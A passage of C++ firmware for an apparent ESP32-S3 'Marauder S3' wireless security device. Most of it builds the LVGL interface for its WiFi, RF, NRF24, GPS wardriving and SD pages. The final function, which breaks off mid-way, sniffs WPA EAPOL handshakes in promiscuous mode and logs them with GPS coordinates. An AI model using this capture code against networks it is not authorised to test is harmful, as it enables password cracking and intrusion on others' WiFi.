    create_setting_row(card, "Frecuencia", "433.92 MHz");
    rf_packets_lbl = create_setting_row(card, "📦 Capturas", "0");
}

void MarauderS3::buildNRFPage(lv_obj_t* parent) {
    lv_obj_t* page = lv_obj_create(parent);
    lv_obj_set_size(page, 320, 176);
    lv_obj_set_pos(page, 0, 176 * 2);
    lv_obj_add_style(page, &s_screen, LV_PART_MAIN);
    lv_obj_set_style_pad_all(page, 6, LV_PART_MAIN);

    lv_obj_t* card = createCard(page, LV_PCT(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);

    lv_obj_t* header = lv_obj_create(card);
    lv_obj_set_size(header, LV_PCT(100), 20);
    lv_obj_set_style_bg_opa(header, 0, LV_PART_MAIN);
    lv_obj_set_style_border_side(header, LV_BORDER_SIDE_BOTTOM, LV_PART_MAIN);
    lv_obj_set_style_border_width(header, 1, LV_PART_MAIN);
    lv_obj_set_style_pad_all(header, 0, LV_PART_MAIN);
    
    lv_obj_t* title = lv_label_create(header);
    lv_label_set_text(title, "🔗 NRF24L01+");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_align(title, LV_ALIGN_LEFT_MID, 0, 0);

    nrf_status_badge = lv_label_create(header);
    lv_label_set_text(nrf_status_badge, "IDLE");
    lv_obj_add_style(nrf_status_badge, &s_badge, LV_PART_MAIN);
    lv_obj_align(nrf_status_badge, LV_ALIGN_RIGHT_MID, 0, 0);

    lv_obj_t* btn_grp = lv_obj_create(card);
    lv_obj_set_size(btn_grp, LV_PCT(100), 30);
    lv_obj_set_style_bg_opa(btn_grp, 0, LV_PART_MAIN);
    lv_obj_set_style_border_width(btn_grp, 0, LV_PART_MAIN);
    lv_obj_set_flex_flow(btn_grp, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_all(btn_grp, 0, LV_PART_MAIN);
    lv_obj_set_style_pad_gap(btn_grp, 4, LV_PART_MAIN);

    const char* btns[] = {"Escanear", "Capturar", "Analizar"};
    for(int i=0; i<3; i++) {
        lv_obj_t* btn = lv_btn_create(btn_grp);
        lv_obj_set_size(btn, 90, 24);
        lv_obj_add_style(btn, i==0 ? &s_btn_primary : &s_btn, LV_PART_MAIN);
        lv_obj_t* lbl = lv_label_create(btn);
        lv_label_set_text(lbl, btns[i]);
        lv_obj_center(lbl);
    }

    nrf_devices_count_lbl = create_setting_row(card, "🖥️ Dispositivos", "0");
    nrf_devices_list_lbl = lv_label_create(card);
    lv_label_set_text(nrf_devices_list_lbl, "-");
    lv_obj_set_style_text_font(nrf_devices_list_lbl, &lv_font_montserrat_10, LV_PART_MAIN);
}

void MarauderS3::buildGPSPage(lv_obj_t* parent) {
    lv_obj_t* page = lv_obj_create(parent);
    lv_obj_set_size(page, 320, 176);
    lv_obj_set_pos(page, 0, 176 * 3);
    lv_obj_add_style(page, &s_screen, LV_PART_MAIN);
    lv_obj_set_style_pad_all(page, 6, LV_PART_MAIN);

    lv_obj_t* card = createCard(page, LV_PCT(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);

    lv_obj_t* header = lv_obj_create(card);
    lv_obj_set_size(header, LV_PCT(100), 20);
    lv_obj_set_style_bg_opa(header, 0, LV_PART_MAIN);
    lv_obj_set_style_border_side(header, LV_BORDER_SIDE_BOTTOM, LV_PART_MAIN);
    lv_obj_set_style_border_width(header, 1, LV_PART_MAIN);
    lv_obj_set_style_pad_all(header, 0, LV_PART_MAIN);
    
    lv_obj_t* title = lv_label_create(header);
    lv_label_set_text(title, "📍 GPS / Wardriving");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_align(title, LV_ALIGN_LEFT_MID, 0, 0);

    gps_fix_badge = lv_label_create(header);
    lv_label_set_text(gps_fix_badge, "BUSCANDO");
    lv_obj_add_style(gps_fix_badge, &s_badge, LV_PART_MAIN);
    lv_obj_align(gps_fix_badge, LV_ALIGN_RIGHT_MID, 0, 0);

    satellites_lbl = lv_label_create(card);
    lv_label_set_text(satellites_lbl, "0");
    lv_obj_set_style_text_font(satellites_lbl, &lv_font_montserrat_24, LV_PART_MAIN);
    lv_obj_set_style_text_color(satellites_lbl, lv_color_hex(C_ACCENT), LV_PART_MAIN);
    lv_obj_align(satellites_lbl, LV_ALIGN_TOP_MID, 0, 0);

    latitude_lbl = create_setting_row(card, "Latitud", "--.-----°");
    longitude_lbl = create_setting_row(card, "Longitud", "--.-----°");
    speed_lbl = create_setting_row(card, "Velocidad", "0 km/h");

    lv_obj_t* btn_grp = lv_obj_create(card);
    lv_obj_set_size(btn_grp, LV_PCT(100), 30);
    lv_obj_set_style_bg_opa(btn_grp, 0, LV_PART_MAIN);
    lv_obj_set_style_border_width(btn_grp, 0, LV_PART_MAIN);
    lv_obj_set_flex_flow(btn_grp, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_all(btn_grp, 0, LV_PART_MAIN);
    lv_obj_set_style_pad_gap(btn_grp, 4, LV_PART_MAIN);

    lv_obj_t* btn1 = lv_btn_create(btn_grp);
    lv_obj_set_size(btn1, 140, 24);
    lv_obj_add_style(btn1, &s_btn_primary, LV_PART_MAIN);
    lv_label_set_text(lv_label_create(btn1), "Iniciar WD");

    lv_obj_t* btn2 = lv_btn_create(btn_grp);
    lv_obj_set_size(btn2, 140, 24);
    lv_obj_add_style(btn2, &s_btn_success, LV_PART_MAIN);
    lv_label_set_text(lv_label_create(btn2), "Guardar");
}

void MarauderS3::buildStoragePage(lv_obj_t* parent) {
    lv_obj_t* page = lv_obj_create(parent);
    lv_obj_set_size(page, 320, 176);
    lv_obj_set_pos(page, 0, 176 * 4);
    lv_obj_add_style(page, &s_screen, LV_PART_MAIN);
    lv_obj_set_style_pad_all(page, 6, LV_PART_MAIN);

    lv_obj_t* card = createCard(page, LV_PCT(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);

    lv_obj_t* header = lv_obj_create(card);
    lv_obj_set_size(header, LV_PCT(100), 20);
    lv_obj_set_style_bg_opa(header, 0, LV_PART_MAIN);
    lv_obj_set_style_border_side(header, LV_BORDER_SIDE_BOTTOM, LV_PART_MAIN);
    lv_obj_set_style_border_width(header, 1, LV_PART_MAIN);
    lv_obj_set_style_pad_all(header, 0, LV_PART_MAIN);
    
    lv_obj_t* title = lv_label_create(header);
    lv_label_set_text(title, "💾 Almacenamiento");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_align(title, LV_ALIGN_LEFT_MID, 0, 0);

    sd_status_badge = lv_label_create(header);
    lv_label_set_text(sd_status_badge, "SD: OK");
    lv_obj_add_style(sd_status_badge, &s_badge, LV_PART_MAIN);
    lv_obj_align(sd_status_badge, LV_ALIGN_RIGHT_MID, 0, 0);

    create_setting_row(card, "Auto-logging", "ON");
    create_setting_row(card, "Formato", "PCAP");

    lv_obj_t* btn_grp = lv_obj_create(card);
    lv_obj_set_size(btn_grp, LV_PCT(100), 30);
    lv_obj_set_style_bg_opa(btn_grp, 0, LV_PART_MAIN);
    lv_obj_set_style_border_width(btn_grp, 0, LV_PART_MAIN);
    lv_obj_set_flex_flow(btn_grp, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_all(btn_grp, 0, LV_PART_MAIN);
    lv_obj_set_style_pad_gap(btn_grp, 4, LV_PART_MAIN);

    lv_obj_t* btn1 = lv_btn_create(btn_grp);
    lv_obj_set_size(btn1, 140, 24);
    lv_obj_add_style(btn1, &s_btn_primary, LV_PART_MAIN);
    lv_label_set_text(lv_label_create(btn1), "Exportar");

    lv_obj_t* btn2 = lv_btn_create(btn_grp);
    lv_obj_set_size(btn2, 140, 24);
    lv_obj_add_style(btn2, &s_btn_danger, LV_PART_MAIN);
    lv_label_set_text(lv_label_create(btn2), "Formatear SD");
}

void MarauderS3::buildInfoPage(lv_obj_t* parent) {
    lv_obj_t* page = lv_obj_create(parent);
    lv_obj_set_size(page, 320, 176);
    lv_obj_set_pos(page, 0, 176 * 5);
    lv_obj_add_style(page, &s_screen, LV_PART_MAIN);
    lv_obj_set_style_pad_all(page, 6, LV_PART_MAIN);

    lv_obj_t* card = createCard(page, LV_PCT(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
    
    lv_obj_t* title = lv_label_create(card);
    lv_label_set_text(title, "ℹ️ Guía Rápida");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_set_style_text_color(title, lv_color_hex(C_ACCENT), LV_PART_MAIN);

    lv_obj_t* info = lv_label_create(card);
    lv_label_set_text(info, "Marauder S3 Security Suite\n"
                            "Diseñado para auditoría WiFi y RF.\n\n"
                            "• WiFi: Escaneo y Handshakes\n"
                            "• RF: CC1101 Sniffer 433MHz\n"
                            "• NRF: Protocolo Nordic\n"
                            "• GPS: Wardriving Integrado\n\n"
                            "Desarrollado por Alan.");
    lv_obj_set_style_text_font(info, &lv_font_montserrat_10, LV_PART_MAIN);
    lv_label_set_long_mode(info, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(info, 280);
}


void MarauderS3::buildUI() {
    initStyles();
    
    // Contenedor Toast
    toast_container = lv_obj_create(lv_layer_top());
    lv_obj_set_size(toast_container, 260, 40);
    lv_obj_align(toast_container, LV_ALIGN_TOP_MID, 0, -50); 
    lv_obj_set_style_bg_color(toast_container, lv_color_hex(C_SUCCESS), LV_PART_MAIN);
    lv_obj_set_style_radius(toast_container, 20, LV_PART_MAIN);
    lv_obj_set_style_border_width(toast_container, 0, LV_PART_MAIN);
    lbl_toast = lv_label_create(toast_container);
    lv_label_set_text(lbl_toast, "Notificación");
    lv_obj_set_style_text_color(lbl_toast, lv_color_hex(0xFFFFFF), LV_PART_MAIN);
    lv_obj_set_style_text_font(lbl_toast, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_center(lbl_toast);

    buildWelcomeScreen();
    
    // Pantalla Principal (Contenido)
    main_content = lv_obj_create(lv_scr_act());
    lv_obj_set_size(main_content, LV_PCT(100), LV_PCT(100));
    lv_obj_add_style(main_content, &s_screen, LV_PART_MAIN);
    lv_obj_clear_flag(main_content, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_style_opa(main_content, 0, LV_PART_MAIN); // Oculto hasta que se inicie

    buildStatusBar();

    // Contenedor de Páginas
    pages_container = lv_obj_create(main_content);
    lv_obj_set_size(pages_container, 320, 240 - 26 - 38);
    lv_obj_set_pos(pages_container, 0, 26);
    lv_obj_set_style_bg_opa(pages_container, 0, LV_PART_MAIN);
    lv_obj_set_style_border_width(pages_container, 0, LV_PART_MAIN);
    lv_obj_set_style_pad_all(pages_container, 0, LV_PART_MAIN);
    lv_obj_add_flag(pages_container, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_scrollbar_mode(pages_container, LV_SCROLLBAR_MODE_OFF);

    // Crear páginas
    buildWiFiPage(pages_container);
    buildRFPage(pages_container);
    buildNRFPage(pages_container);
    buildGPSPage(pages_container);
    buildStoragePage(pages_container);
    buildInfoPage(pages_container);

    buildBottomNav();

    applyTheme();
    
    // Cargar bienvenida
    lv_scr_load(screen_welcome);
}

void MarauderS3::buildWelcomeScreen() {
    screen_welcome = lv_obj_create(NULL);
    lv_obj_add_style(screen_welcome, &s_screen, LV_PART_MAIN);
    lv_obj_set_style_bg_color(screen_welcome, lv_color_hex(C_SURFACE_LIGHT), LV_PART_MAIN);

    lv_obj_t* cont = lv_obj_create(screen_welcome);
    lv_obj_set_size(cont, LV_PCT(100), LV_PCT(100));
    lv_obj_center(cont);
    lv_obj_set_style_bg_opa(cont, 0, LV_PART_MAIN);
    lv_obj_set_style_border_width(cont, 0, LV_PART_MAIN);
    lv_obj_set_flex_flow(cont, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(cont, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    lv_obj_t* icon = lv_label_create(cont);
    lv_label_set_text(icon, "🌍");
    lv_obj_set_style_text_font(icon, &lv_font_montserrat_40, LV_PART_MAIN);

    lv_obj_t* title = lv_label_create(cont);
    lv_label_set_text(title, "MARAUDER S3");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_16, LV_PART_MAIN);
    lv_obj_set_style_text_color(title, lv_color_hex(C_ACCENT), LV_PART_MAIN);

    lv_obj_t* sub = lv_label_create(cont);
    lv_label_set_text(sub, "SECURITY SUITE");
    lv_obj_set_style_text_font(sub, &lv_font_montserrat_10, LV_PART_MAIN);
    lv_obj_set_style_text_color(sub, lv_color_hex(C_TEXT2_LIGHT), LV_PART_MAIN);

    lv_obj_t* name = lv_label_create(cont);
    lv_label_set_text(name, "Bienvenido Alan");
    lv_obj_set_style_text_font(name, &lv_font_montserrat_14, LV_PART_MAIN);
    lv_obj_set_style_text_color(name, lv_color_hex(C_TEXT_LIGHT), LV_PART_MAIN);
    lv_obj_set_style_margin_top(name, 10, LV_PART_MAIN);

    lv_obj_t* btn = lv_btn_create(cont);
    lv_obj_set_size(btn, 120, 32);
    lv_obj_add_style(btn, &s_btn_primary, LV_PART_MAIN);
    lv_obj_set_style_radius(btn, 16, LV_PART_MAIN);
    lv_obj_t* lbl = lv_label_create(btn);
    lv_label_set_text(lbl, "Iniciar");
    lv_obj_center(lbl);

    lv_obj_add_event_cb(btn, [](lv_event_t* e) {
        MarauderS3* m = (MarauderS3*)lv_event_get_user_data(e);
        lv_obj_set_style_opa(m->main_content, LV_OPA_COVER, LV_PART_MAIN);
        lv_scr_load_anim(m->main_content, LV_SCR_LOAD_ANIM_FADE_ON, 500, 0, false);
        m->showToast("🚀 Sistema iniciado", C_SUCCESS);
    }, LV_EVENT_CLICKED, this);
}

void MarauderS3::buildStatusBar() {
    ui_top_bar = lv_obj_create(main_content);
    lv_obj_set_size(ui_top_bar, 320, 26);
    lv_obj_set_pos(ui_top_bar, 0, 0);
    lv_obj_set_style_bg_color(ui_top_bar, lv_color_hex(C_SURFACE2_LIGHT), LV_PART_MAIN);
    lv_obj_set_style_border_side(ui_top_bar, LV_BORDER_SIDE_BOTTOM, LV_PART_MAIN);
    lv_obj_set_style_border_width(ui_top_bar, 1, LV_PART_MAIN);
    lv_obj_set_style_border_color(ui_top_bar, lv_color_hex(C_BORDER_LIGHT), LV_PART_MAIN);
    lv_obj_set_style_pad_hor(ui_top_bar, 12, LV_PART_MAIN);
    lv_obj_set_style_pad_ver(ui_top_bar, 0, LV_PART_MAIN);
    lv_obj_clear_flag(ui_top_bar, LV_OBJ_FLAG_SCROLLABLE);

    lbl_clock = lv_label_create(ui_top_bar);
    lv_label_set_text(lbl_clock, "00:00");
    lv_obj_set_style_text_font(lbl_clock, &lv_font_montserrat_10, LV_PART_MAIN);
    lv_obj_align(lbl_clock, LV_ALIGN_LEFT_MID, 0, 0);

    lv_obj_t* right_cont = lv_obj_create(ui_top_bar);
    lv_obj_set_size(right_cont, 120, 26);
    lv_obj_align(right_cont, LV_ALIGN_RIGHT_MID, 0, 0);
    lv_obj_set_style_bg_opa(right_cont, 0, LV_PART_MAIN);
    lv_obj_set_style_border_width(right_cont, 0, LV_PART_MAIN);
    lv_obj_set_flex_flow(right_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(right_cont, LV_FLEX_ALIGN_END, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(right_cont, 0, LV_PART_MAIN);
    lv_obj_set_style_pad_gap(right_cont, 8, LV_PART_MAIN);

    lbl_bat_pct = lv_label_create(right_cont);
    lv_label_set_text(lbl_bat_pct, "100%");
    lv_obj_set_style_text_font(lbl_bat_pct, &lv_font_montserrat_10, LV_PART_MAIN);

    theme_toggle = lv_obj_create(right_cont);
    lv_obj_set_size(theme_toggle, 34, 18);
    lv_obj_set_style_bg_color(theme_toggle, lv_color_hex(C_SUCCESS), LV_PART_MAIN);
    lv_obj_set_style_radius(theme_toggle, 9, LV_PART_MAIN);
    lv_obj_add_flag(theme_toggle, LV_OBJ_FLAG_CLICKABLE);
    lv_obj_t* knob = lv_obj_create(theme_toggle);
    lv_obj_set_size(knob, 14, 14);
    lv_obj_set_style_radius(knob, LV_RADIUS_CIRCLE, LV_PART_MAIN);
    lv_obj_set_style_bg_color(knob, lv_color_hex(0xFFFFFF), LV_PART_MAIN);
    lv_obj_align(knob, LV_ALIGN_RIGHT_MID, -2, 0);

    lv_obj_add_event_cb(theme_toggle, [](lv_event_t* e) {
        is_light_theme = !is_light_theme;
        applyTheme();
        MarauderS3* m = (MarauderS3*)lv_event_get_user_data(e);
        m->showToast(is_light_theme ? "☀️ Modo claro" : "🌙 Modo oscuro", C_ACCENT);
    }, LV_EVENT_CLICKED, this);

    lv_obj_t* bat_icon = lv_obj_create(right_cont);
    lv_obj_set_size(bat_icon, 16, 8);
    lv_obj_set_style_border_width(bat_icon, 1, LV_PART_MAIN);
    lv_obj_set_style_border_color(bat_icon, lv_color_hex(C_TEXT2_LIGHT), LV_PART_MAIN);
    lv_obj_set_style_radius(bat_icon, 2, LV_PART_MAIN);
    bat_fill = lv_obj_create(bat_icon);
    lv_obj_set_size(bat_fill, 12, 6);
    lv_obj_set_style_bg_color(bat_fill, lv_color_hex(C_SUCCESS), LV_PART_MAIN);
    lv_obj_align(bat_fill, LV_ALIGN_LEFT_MID, 0, 0);
}

void MarauderS3::buildBottomNav() {
    bottom_nav = lv_obj_create(main_content);
    lv_obj_set_size(bottom_nav, 320, 38);
    lv_obj_align(bottom_nav, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(bottom_nav, lv_color_hex(C_SURFACE2_LIGHT), LV_PART_MAIN);
    lv_obj_set_style_border_side(bottom_nav, LV_BORDER_SIDE_TOP, LV_PART_MAIN);
    lv_obj_set_style_border_width(bottom_nav, 1, LV_PART_MAIN);
    lv_obj_set_style_border_color(bottom_nav, lv_color_hex(C_BORDER_LIGHT), LV_PART_MAIN);
    lv_obj_set_style_pad_all(bottom_nav, 4, LV_PART_MAIN);
    lv_obj_set_style_pad_gap(bottom_nav, 2, LV_PART_MAIN);
    lv_obj_set_flex_flow(bottom_nav, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(bottom_nav, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    const char* icons[] = {"📶", "📻", "🔗", "📍", "💾", "ℹ️"};
    const char* names[] = {"WiFi", "RF", "NRF", "GPS", "Datos", "Info"};

    for(int i=0; i<6; i++) {
        lv_obj_t* btn = lv_btn_create(bottom_nav);
        lv_obj_set_size(btn, 50, 30);
        lv_obj_add_style(btn, &s_nav_btn, LV_PART_MAIN);
        
        lv_obj_t* icon = lv_label_create(btn);
        lv_label_set_text(icon, icons[i]);
        lv_obj_align(icon, LV_ALIGN_TOP_MID, 0, -2);

        lv_obj_t* lbl = lv_label_create(btn);
        lv_label_set_text(lbl, names[i]);
        lv_obj_set_style_text_font(lbl, &lv_font_montserrat_10, LV_PART_MAIN);
        lv_obj_align(lbl, LV_ALIGN_BOTTOM_MID, 0, 2);

        struct NavData { MarauderS3* m; int idx; };
        NavData* nd = new NavData{this, i};

        lv_obj_add_event_cb(btn, [](lv_event_t* e) {
            NavData* d = (NavData*)lv_event_get_user_data(e);
            lv_obj_scroll_to_y(d->m->pages_container, d->idx * 176, LV_ANIM_ON); // Aproximado
            // O mejor usar páginas separadas y ocultar/mostrar
        }, LV_EVENT_CLICKED, nd);
    }
}

// ======================== ACTUALIZACIONES UI ========================
void MarauderS3::updateGPSUI() {
    GPSData d;
    if (gpsMutex && xSemaphoreTake(gpsMutex, pdMS_TO_TICKS(20)) == pdTRUE) {
        d = gpsData;
        xSemaphoreGive(gpsMutex);
    } else return;

    if (gps_fix_badge) {
        if (d.valid) {
            lv_label_set_text(gps_fix_badge, "FIX 3D");
            lv_obj_set_style_text_color(gps_fix_badge, lv_color_hex(C_SUCCESS), LV_PART_MAIN);
        } else {
            lv_label_set_text(gps_fix_badge, "BUSCANDO");
            lv_obj_set_style_text_color(gps_fix_badge, lv_color_hex(C_WARNING), LV_PART_MAIN);
        }
    }

    if (satellites_lbl) {
        char buf[32];
        snprintf(buf, sizeof(buf), "%d", d.sats);
        lv_label_set_text(satellites_lbl, buf);
        
        if (d.valid) {
            snprintf(buf, sizeof(buf), "%.5f°", d.lat);
            lv_label_set_text(latitude_lbl, buf);
            snprintf(buf, sizeof(buf), "%.5f°", d.lng);
            lv_label_set_text(longitude_lbl, buf);
            snprintf(buf, sizeof(buf), "%.1f km/h", d.speed);
            lv_label_set_text(speed_lbl, buf);
        }
    }
}

void MarauderS3::updateBatteryUI() {
    if (!lbl_bat_pct) return;

    char buf[16];
    snprintf(buf, sizeof(buf), "%d%%", batPercent);
    lv_label_set_text(lbl_bat_pct, buf);

    uint32_t color = C_SUCCESS;
    if (batPercent <= 20) color = C_DANGER;
    else if (batPercent <= 50) color = C_WARNING;

    if (bat_fill) {
        lv_obj_set_width(bat_fill, (12 * batPercent) / 100);
        lv_obj_set_style_bg_color(bat_fill, lv_color_hex(color), LV_PART_MAIN);
    }
}

void MarauderS3::updateWiFiUI() {
    if (!list_wifi) return;
    
    char b[16];
    snprintf(b, sizeof(b), "%d", wifiNetworksCount);
    if (networks_count_lbl) lv_label_set_text(networks_count_lbl, b);
    
    lv_obj_clean(list_wifi);
    int n = WiFi.scanComplete();
    if (n == -2) n = WiFi.scanNetworks();
    
    if (n > 0) {
        wifiNetworksCount = n;
        for (int i = 0; i < n && i < 15; ++i) {
            lv_obj_t* row = lv_obj_create(list_wifi);
            lv_obj_set_size(row, LV_PCT(100), 28);
            lv_obj_set_style_bg_opa(row, 0, LV_PART_MAIN);
            lv_obj_set_style_border_side(row, LV_BORDER_SIDE_BOTTOM, LV_PART_MAIN);
            lv_obj_set_style_border_width(row, 1, LV_PART_MAIN);
            lv_obj_set_style_border_color(row, lv_color_hex(C_BORDER_LIGHT), LV_PART_MAIN);
            lv_obj_set_style_pad_all(row, 0, LV_PART_MAIN);
            lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);

            lv_obj_t* name = lv_label_create(row);
            lv_label_set_text(name, WiFi.SSID(i).c_str());
            lv_obj_set_style_text_font(name, &lv_font_montserrat_10, LV_PART_MAIN);
            lv_obj_align(name, LV_ALIGN_LEFT_MID, 4, 0);

            lv_obj_t* btn = lv_btn_create(row);
            lv_obj_set_size(btn, 36, 18);
            lv_obj_add_style(btn, &s_btn_primary, LV_PART_MAIN);
            lv_obj_align(btn, LV_ALIGN_RIGHT_MID, -4, 0);
            lv_obj_t* lbl = lv_label_create(btn);
            lv_label_set_text(lbl, "CAP");
            lv_obj_set_style_text_font(lbl, &lv_font_montserrat_10, LV_PART_MAIN);
            lv_obj_center(lbl);
            
            lv_obj_add_event_cb(btn, btn_cap_event, LV_EVENT_CLICKED, this);
        }
    } else {
        lv_obj_t* lbl = lv_label_create(list_wifi);
        lv_label_set_text(lbl, "No se encontraron redes");
        lv_obj_set_style_text_font(lbl, &lv_font_montserrat_10, LV_PART_MAIN);
        lv_obj_center(lbl);
    }
}

void MarauderS3::refreshUiChrome() {
    uint32_t fg = is_light_theme ? C_TEXT_LIGHT : C_TEXT_DARK;
    uint32_t fg2 = is_light_theme ? C_TEXT2_LIGHT : C_TEXT2_DARK;
    uint32_t bg = is_light_theme ? C_SURFACE2_LIGHT : C_SURFACE2_DARK;
    uint32_t border = is_light_theme ? C_BORDER_LIGHT : C_BORDER_DARK;

    if (lbl_clock) lv_obj_set_style_text_color(lbl_clock, lv_color_hex(fg), LV_PART_MAIN);
    if (lbl_bat_pct) lv_obj_set_style_text_color(lbl_bat_pct, lv_color_hex(fg2), LV_PART_MAIN);

    if (ui_top_bar) {
        lv_obj_set_style_bg_color(ui_top_bar, lv_color_hex(bg), LV_PART_MAIN);
        lv_obj_set_style_border_color(ui_top_bar, lv_color_hex(border), LV_PART_MAIN);
    }

    if (bottom_nav) {
        lv_obj_set_style_bg_color(bottom_nav, lv_color_hex(bg), LV_PART_MAIN);
        lv_obj_set_style_border_color(bottom_nav, lv_color_hex(border), LV_PART_MAIN);
    }

    if (rf_packets_lbl) lv_obj_set_style_text_color(rf_packets_lbl, lv_color_hex(fg2), LV_PART_MAIN);
    if (nrf_devices_count_lbl) lv_obj_set_style_text_color(nrf_devices_count_lbl, lv_color_hex(fg2), LV_PART_MAIN);
}

void MarauderS3::processEvents() {
    AppEvent e;
    while (xQueueReceive(eventQueue, &e, 0) == pdTRUE) {
        switch (e.type) {
            case EVT_GPS:    updateGPSUI(); break;
            case EVT_BAT:    updateBatteryUI(); break;
            case EVT_STATUS: 
                // Actualizar badges de estado si es necesario
                break;
            case EVT_WIFI:
                showToast("Escaneo WiFi completado", C_ACCENT);
                updateWiFiUI();
                break;
            default: break;
        }
    }
    
    if (rf_packets_lbl) {
        char rb[12];
        snprintf(rb, sizeof(rb), "%u", (unsigned)capturedSignals.size());
        lv_label_set_text(rf_packets_lbl, rb);
    }

    // Reloj
    if (lbl_clock) {
        static uint32_t last_clock = 0;
        if (millis() - last_clock > 1000) {
            last_clock = millis();
            char buf[16];
            bool time_set = false;
            
            if (gpsMutex && xSemaphoreTake(gpsMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
                if (gps.time.isValid() && gps.time.age() < 2000) {
                    snprintf(buf, sizeof(buf), "%02d:%02d", gps.time.hour(), gps.time.minute());
                    time_set = true;
                }
                xSemaphoreGive(gpsMutex);
            }
            
            if (!time_set) {
                uint32_t mins = (millis() / 60000) % 60;
                uint32_t hrs = (millis() / 3600000) % 24;
                snprintf(buf, sizeof(buf), "%02lu:%02lu", hrs, mins);
            }
            lv_label_set_text(lbl_clock, buf);
        }
    }
}

void MarauderS3::begin() {
    gpsMutex = xSemaphoreCreateMutex();
    spiMutex = xSemaphoreCreateMutex();
    sdMutex = xSemaphoreCreateMutex();
    eventQueue = xQueueCreate(30, sizeof(AppEvent));
}

// ======================== IMPLEMENTACIONES REALES ========================

// ─── SD CARD ───
bool MarauderS3::initSDCard() {
    if (xSemaphoreTake(spiMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        if (!SD.begin(SD_CS)) {
            Serial.println("[SD] ❌ Montaje fallido");
            xSemaphoreGive(spiMutex);
            return false;
        }
        
        sdCardMounted = true;
        uint32_t cardSize = SD.cardSize() / (1024 * 1024);
        Serial.printf("[SD] ✅ Montada: %d MB\n", cardSize);
        
        if (!SD.exists("/pcap")) SD.mkdir("/pcap");
        if (!SD.exists("/logs")) SD.mkdir("/logs");
        if (!SD.exists("/signals")) SD.mkdir("/signals");
        if (!SD.exists("/wardrive")) SD.mkdir("/wardrive");
        
        char filename[64];
        snprintf(filename, sizeof(filename), "/logs/session_%lu.json", millis());
        jsonLogFile = SD.open(filename, FILE_WRITE);
        if (jsonLogFile) {
            jsonLogFile.println("{\"session_start\": " + String(millis()) + ",");
            jsonLogFile.println("\"firmware\": \"Marauder-S3 v3.0\",");
            jsonLogFile.println("\"events\": [");
        }
        
        snprintf(filename, sizeof(filename), "/wardrive/scan_%lu.csv", millis());
        warDriveFile = SD.open(filename, FILE_WRITE);
        if (warDriveFile) {
            warDriveFile.println("timestamp,gps_lat,gps_lng,bssid,ssid,rssi,channel,encryption");
        }
        
        xSemaphoreGive(spiMutex);
        
        if (sdStatusLabel) {
            lv_label_set_text(sdStatusLabel, "SD: OK");
            lv_obj_set_style_text_color(sdStatusLabel, lv_color_hex(C_SUCCESS), LV_PART_MAIN);
        }
        return true;
    }
    return false;
}

// ─── CAPTURA DE HANDSHAKES WIFI ───
void MarauderS3::captureWiFiHandshake() {
    WiFi.mode(WIFI_MODE_AP);
    esp_wifi_set_promiscuous(true);
    
    esp_wifi_set_promiscuous_rx_cb([](void *buf, wifi_promiscuous_pkt_type_t type) {
        wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
        wifi_pkt_rx_ctrl_t *ctrl = &pkt->rx_ctrl;
        uint8_t *frame = pkt->payload;
        uint8_t frame_type = frame[0] & 0xFC;
        
        if (pkt->payload[12] == 0x88 && pkt->payload[13] == 0x8E) {
            WiFiHandshake hs;
            memcpy(hs.bssid, &frame[10], 6);
            memcpy(hs.station, &frame[4], 6);
            hs.timestamp = millis();
            hs.rssi = ctrl->rssi;
            
            uint8_t eapol_type = frame[15];
            if (eapol_type == 0x01) hs.frame_type = 1;
            else if (eapol_type == 0x02) hs.frame_type = 2;
            else if (eapol_type == 0x03) hs.frame_type = 3;
            else if (eapol_type == 0x04) hs.frame_type = 4;
            
            hs.data_len = pkt->rx_ctrl.sig_len;
            if (hs.data_len > 256) hs.data_len = 256;
            memcpy(hs.data, frame, hs.data_len);
            
            if (marauder.gpsFixed && xSemaphoreTake(marauder.gpsMutex, pdMS_TO_TICKS(10))) {
                hs.gps_lat = marauder.gpsData.lat;
                hs.gps_lng = marauder.gpsData.lng;
                xSemaphoreGive(marauder.gpsMutex);
            }
            
            if (marauder.capturedHandshakes.size() > 100) {
                marauder.capturedHandshakes.erase(marauder.capturedHandshakes.begin());
            }
            marauder.capturedHandshakes.push_back(hs);
            marauder.handshakeCount++;
            marauder.saveHandshakeToSD(hs);
            
            AppEvent evt{EVT_STATUS, marauder.handshakeCount, ""};
            snprintf(evt.msg, sizeof(evt.msg), "Handshake #%d capturado!", marauder.handshakeCount);
            xQueueSend(marauder.eventQueue, &evt, 0);
        }
        
        if (frame_type == 0x00 && frame[0] == 0x00) {
